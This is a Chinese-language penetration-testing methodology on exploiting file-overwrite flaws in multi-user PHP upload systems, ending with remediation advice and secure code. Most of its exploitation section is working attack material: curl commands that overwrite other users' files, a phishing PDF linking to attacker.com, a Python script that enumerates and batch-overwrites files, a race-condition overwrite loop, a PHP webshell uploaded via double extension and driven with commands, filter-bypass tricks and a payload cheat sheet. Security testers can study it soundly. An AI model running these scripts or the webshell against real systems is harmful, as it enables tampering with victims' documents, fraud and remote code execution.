# 文件覆盖漏洞利用方法论

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供一套标准化、可复现的文件覆盖漏洞攻击方法，针对多用户系统中文件上传功能缺少用户隔离和所有权验证的场景，指导测试人员发现和利用文件覆盖漏洞实现数据完整性破坏、恶意文件替换等攻击目标。

### 1.2 适用范围
本文档适用于以下场景：
- 多用户文件上传系统使用共享存储目录
- 文件上传无用户子目录隔离
- 上传文件名未进行唯一化处理（无 UUID、时间戳前缀）
- 缺少文件存在性检查和覆盖警告
- 无文件版本控制或备份机制

### 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责代码审计的开发人员。

---

## 第二部分：核心渗透技术专题

### 专题一：文件覆盖漏洞利用

#### 2.1 技术介绍

文件覆盖漏洞是指多用户文件上传系统中，由于缺少用户隔离机制和文件名唯一化处理，攻击者可以上传与现有文件同名的文件，导致原始文件被恶意替换的安全缺陷。

**漏洞本质：**
- 所有用户上传文件存储于同一共享目录
- 文件名直接使用客户端提供的原始文件名
- 无用户子目录或文件名前缀隔离
- `move_uploaded_file()` 等函数静默覆盖现有文件
- 无文件存在性检查或覆盖确认机制

**典型攻击流程：**
```
1. 用户 A 上传 confidential.pdf → 存储于 ./uploads/confidential.pdf
2. 攻击者发现文件名（通过目录列表或预测）
3. 攻击者上传恶意文件，同名：confidential.pdf
4. 系统静默覆盖，用户 A 的文件永久丢失
5. 攻击者访问文件，提供恶意内容
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 发票/收据上传 | 用户上传 PDF 发票 | 共享目录，攻击者可覆盖他人发票 |
| 文档协作系统 | 多人编辑同一文档 | 恶意覆盖破坏文档完整性 |
| 头像上传 | 用户头像存储 | 覆盖他人头像进行钓鱼攻击 |
| 合同签署系统 | 电子合同上传 | 覆盖已签署合同进行欺诈 |
| 报表系统 | 财务报表上传 | 覆盖报表进行财务欺诈 |
| 证据提交系统 | 法律证据上传 | 覆盖证据破坏司法公正 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**步骤 1：识别文件上传功能**
```bash
# 查找文件上传表单
curl http://target/dashboard.php | grep -i "input.*file"

# 或查找上传端点
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=valid_session" \
  -F "file=@test1.pdf"
```

**步骤 2：上传测试文件并记录响应**
```bash
# 用户 A 上传文件
echo "USER_A_CONTENT_VERSION_1" > /tmp/test_file.pdf
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=user_a_session" \
  -F "invoice=@/tmp/test_file.pdf"

# 记录响应
# 预期：{"status":"success","message":"File uploaded"}

# 验证文件内容
curl http://target/uploaded_invoices/test_file.pdf
# 预期输出：USER_A_CONTENT_VERSION_1
```

**步骤 3：使用不同会话上传同名文件**
```bash
# 用户 B（攻击者）上传同名文件
echo "USER_B_MALICIOUS_CONTENT_VERSION_2" > /tmp/test_file.pdf
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=user_b_session" \
  -F "invoice=@/tmp/test_file.pdf"

# 记录响应
# 如果仍返回 success，则存在覆盖漏洞
```

**步骤 4：验证文件是否被覆盖**
```bash
# 检查文件内容
curl http://target/uploaded_invoices/test_file.pdf

# 如果输出变为：USER_B_MALICIOUS_CONTENT_VERSION_2
# 则确认存在文件覆盖漏洞
```

##### 2.3.2 白盒测试

**代码审计要点：**

1. **检查文件存储路径配置**
```php
// 漏洞代码示例
$uploadFileDir = './uploaded_invoices/';  // 共享目录
$dest_path = $uploadFileDir . $fileName;  // 直接使用原始文件名

// 问题：
// - 无用户子目录
// - 无文件名唯一化处理
// - 直接拼接路径
```

2. **检查文件移动操作**
```php
// 漏洞代码示例 - 静默覆盖
move_uploaded_file($fileTmpPath, $dest_path);

// 安全代码示例 - 检查文件是否存在
if (file_exists($dest_path)) {
    // 生成唯一文件名
    $unique_name = uniqid() . '_' . $fileName;
    $dest_path = $uploadFileDir . $unique_name;
}
move_uploaded_file($fileTmpPath, $dest_path);
```

3. **检查数据库所有权追踪**
```sql
-- 安全设计应有文件元数据表
CREATE TABLE uploaded_files (
    id INT PRIMARY KEY AUTO_INCREMENT,
    original_filename VARCHAR(255),
    stored_filename VARCHAR(255) UNIQUE,  -- 唯一化存储名
    user_id INT,
    upload_time TIMESTAMP,
    file_hash VARCHAR(64),  -- 文件完整性校验
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- 漏洞系统通常：
-- - 缺少此表
-- - 或 stored_filename 无 UNIQUE 约束
-- - 或无 user_id 所有权字段
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础文件覆盖攻击

**利用场景 1：破坏数据完整性**
```bash
#!/bin/bash

# 目标：破坏用户 A 的重要文件

# 步骤 1：侦察 - 获取目标文件名
# 方法 A：目录列表
curl http://target/uploaded_invoices/ | grep -oP 'href="\K[^"]+\.pdf'

# 方法 B：社会工程学询问
# 方法 C：基于命名规则预测

# 步骤 2：准备恶意内容
echo "MALICIOUS_CONTENT_REPLACE_ORIGINAL_DATA" > /tmp/invoice.pdf

# 步骤 3：上传覆盖
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=attacker_session" \
  -F "invoice=@/tmp/invoice.pdf"

# 步骤 4：验证覆盖成功
curl http://target/uploaded_invoices/invoice.pdf
# 预期输出：MALICIOUS_CONTENT_REPLACE_ORIGINAL_DATA
```

**利用场景 2：钓鱼攻击**
```bash
#!/bin/bash

# 目标：替换合法文件为钓鱼内容

# 准备钓鱼 PDF（包含恶意链接）
cat > /tmp/invoice.pdf << 'EOF'
%PDF-1.4
重要通知：您的账户需要验证
请点击以下链接验证账户：
http://attacker.com/phishing-page
EOF

# 上传钓鱼文件
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=attacker_session" \
  -F "invoice=@/tmp/invoice.pdf"

# 受害者访问时看到钓鱼内容
```

##### 2.4.2 自动化文件覆盖攻击

**Python 自动化脚本：**
```python
#!/usr/bin/env python3
import requests
import os

class FileOverwriteAttacker:
    def __init__(self, base_url, upload_endpoint, cookie):
        self.base_url = base_url
        self.upload_endpoint = upload_endpoint
        self.cookie = cookie
        self.session = requests.Session()
        self.session.cookies.set('PHPSESSID', cookie)
    
    def enumerate_files(self):
        """枚举可访问的文件"""
        try:
            response = self.session.get(f"{self.base_url}/uploaded_invoices/")
            if response.status_code == 200:
                # 解析目录列表
                import re
                files = re.findall(r'href="([^"]+)"', response.text)
                return [f for f in files if f.endswith(('.pdf', '.xlsx', '.docx'))]
        except Exception as e:
            print(f"[-] Enumeration failed: {e}")
        return []
    
    def overwrite_file(self, filename, content):
        """覆盖指定文件"""
        # 创建临时文件
        temp_path = f"/tmp/{filename}"
        with open(temp_path, 'w') as f:
            f.write(content)
        
        # 上传覆盖
        files = {'invoice': (filename, open(temp_path, 'rb'))}
        response = self.session.post(
            f"{self.base_url}{self.upload_endpoint}",
            files=files
        )
        
        # 清理临时文件
        os.remove(temp_path)
        
        return response.status_code == 200
    
    def verify_overwrite(self, filename, expected_content):
        """验证文件是否被覆盖"""
        url = f"{self.base_url}/uploaded_invoices/{filename}"
        response = self.session.get(url)
        return expected_content in response.text
    
    def attack(self, target_files, malicious_content):
        """执行批量覆盖攻击"""
        results = []
        
        for filename in target_files:
            print(f"[*] Attacking: {filename}")
            
            if self.overwrite_file(filename, malicious_content):
                if self.verify_overwrite(filename, malicious_content):
                    print(f"[+] Success: {filename}")
                    results.append(filename)
                else:
                    print(f"[-] Verification failed: {filename}")
            else:
                print(f"[-] Upload failed: {filename}")
        
        return results

# 使用示例
if __name__ == "__main__":
    attacker = FileOverwriteAttacker(
        base_url="http://localhost:35845",
        upload_endpoint="/upload.php",
        cookie="attacker_session_id"
    )
    
    # 枚举目标文件
    files = attacker.enumerate_files()
    print(f"[*] Found {len(files)} files: {files}")
    
    # 执行覆盖攻击
    malicious_content = "MALICIOUS_CONTENT_BY_ATTACKER"
    success = attacker.attack(files, malicious_content)
    
    print(f"\n[+] Successfully overwritten {len(success)} files")
```

##### 2.4.3 高级利用场景

**场景 1：竞争条件利用**
```bash
#!/bin/bash

# 在高频上传场景中利用竞争条件
# 目标：在合法用户上传后立即覆盖

TARGET_FILE="critical_document.pdf"
MALICIOUS_CONTENT="ATTACKER_CONTENT"

# 监控文件变化
while true; do
    # 检查文件是否更新（通过 ETag 或 Last-Modified）
    ETAG=$(curl -sI http://target/uploaded_invoices/$TARGET_FILE | grep -i etag | cut -d' ' -f2)
    
    # 如果文件变化，立即覆盖
    if [ "$PREV_ETAG" != "$ETAG" ] && [ -n "$ETAG" ]; then
        echo "[*] File changed, overwriting..."
        echo "$MALICIOUS_CONTENT" > /tmp/$TARGET_FILE
        curl -X POST http://target/upload.php \
          -H "Cookie: PHPSESSID=attacker" \
          -F "invoice=@/tmp/$TARGET_FILE"
    fi
    
    PREV_ETAG=$ETAG
    sleep 1
done
```

**场景 2：持久化后门**
```bash
#!/bin/bash

# 如果上传目录可执行 PHP
# 上传 Webshell 后门

cat > /tmp/shell.php.pdf << 'EOF'
<?php
if (isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
?>
EOF

# 覆盖现有文件创建后门
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=attacker" \
  -F "invoice=@/tmp/shell.php.pdf"

# 访问后门
curl -X POST http://target/uploaded_invoices/shell.php.pdf \
  -d "cmd=id"
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过文件扩展名检查

**技术 1：双扩展名绕过**
```bash
# 如果服务器检查 .pdf 扩展名
# 使用双扩展名绕过
echo "MALICIOUS_PHP_CODE" > /tmp/shell.php.pdf
curl -X POST http://target/upload.php \
  -H "Cookie: PHPSESSID=attacker" \
  -F "invoice=@/tmp/shell.php.pdf"

# 如果服务器只检查最后一个扩展名
# 实际存储为 shell.php.pdf，但可执行 PHP
```

**技术 2：空字节截断（旧版本 PHP）**
```bash
# PHP < 5.3.4 存在空字节截断漏洞
# 上传 shell.php%00.pdf
# 实际存储为 shell.php

# 注意：此漏洞在现代 PHP 版本中已修复
```

**技术 3：大小写变异**
```bash
# 如果服务器检查小写扩展名
echo "MALICIOUS" > /tmp/file.PDF
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/file.PDF"

# 或混合大小写
echo "MALICIOUS" > /tmp/file.Pdf
```

##### 2.5.2 绕过文件名 sanitization

**技术 1：URL 编码绕过**
```bash
# 如果服务器解码文件名但未正确 sanitization
# 上传编码后的文件名

# 原始文件名：shell.php
# URL 编码：shell%2Ephp（. 的 URL 编码是%2E）

# 某些服务器解码后处理，可能绕过过滤
```

**技术 2：Unicode 规范化绕过**```bash
# 使用 Unicode 字符绕过 ASCII 检查
# 例如使用全角字符：shell.php（全角点）

# 某些系统规范化后变为标准 ASCII
```

**技术 3：路径遍历组合**
```bash
# 组合路径遍历和文件覆盖
# 上传到特定目录覆盖关键文件

echo "MALICIOUS" > /tmp/../../var/www/html/config.php
curl -X POST http://target/upload.php \
  -F "invoice=@/tmp/../../var/www/html/config.php"

# 注意：现代 PHP 的 move_uploaded_file 会阻止此攻击
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|-------------|------|
| **基础覆盖** | 替换文件内容 | `echo "MALICIOUS" > file.pdf` | 简单内容替换 |
| **钓鱼攻击** | 社会工程学攻击 | PDF 包含恶意链接 | 诱导用户点击 |
| **Webshell** | 远程代码执行 | `<?php system($_GET['c']);?>` | PHP 后门 |
| **XSS** | 跨站脚本攻击 | `<script>alert(1)</script>.pdf` | 存储型 XSS |
| **竞争条件** | 高频覆盖 | 监控 + 快速上传循环 |  race condition |
| **批量攻击** | 多文件覆盖 | Python 脚本批量处理 | 自动化攻击 |

### 3.2 漏洞验证检查清单

- [ ] 多用户文件上传功能存在
- [ ] 所有用户上传到同一共享目录
- [ ] 文件名直接使用客户端提供的名称
- [ ] 无用户子目录隔离
- [ ] 无文件名唯一化处理（UUID/时间戳）
- [ ] 上传操作静默覆盖现有文件
- [ ] 无文件存在性检查或警告
- [ ] 可成功覆盖其他用户的文件
- [ ] 覆盖后原文件内容完全丢失

### 3.3 修复建议

**短期修复：**
1. 立即添加文件存在性检查
2. 覆盖前向用户发出警告
3. 实施简单的文件名前缀（用户 ID）

**长期修复：**
1. 为每个用户创建独立子目录
2. 使用 UUID 作为存储文件名
3. 实施文件版本控制
4. 添加文件完整性校验（哈希）
5. 实现基于数据库的所有权追踪

**代码修复示例：**
```php
// 安全实现
session_start();
$user_id = $_SESSION['user_id'];

// 创建用户专属目录
$user_dir = './uploaded_invoices/user_' . $user_id . '/';
if (!file_exists($user_dir)) {
    mkdir($user_dir, 0755, true);
}

// 生成唯一文件名
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$unique_filename = uniqid('file_', true) . '.' . $extension;
$dest_path = $user_dir . $unique_filename;

// 记录文件元数据到数据库
$stmt = $db->prepare("INSERT INTO files (user_id, original_name, stored_name, path) VALUES (?, ?, ?, ?)");
$stmt->execute([$user_id, $fileName, $unique_filename, $dest_path]);

// 移动文件
move_uploaded_file($fileTmpPath, $dest_path);
```

---

**文档版本：** 1.0  
**最后更新：** 2024 年 1 月  
**适用场景：** PHP/Python/Node.js 多用户文件上传系统的文件覆盖漏洞测试
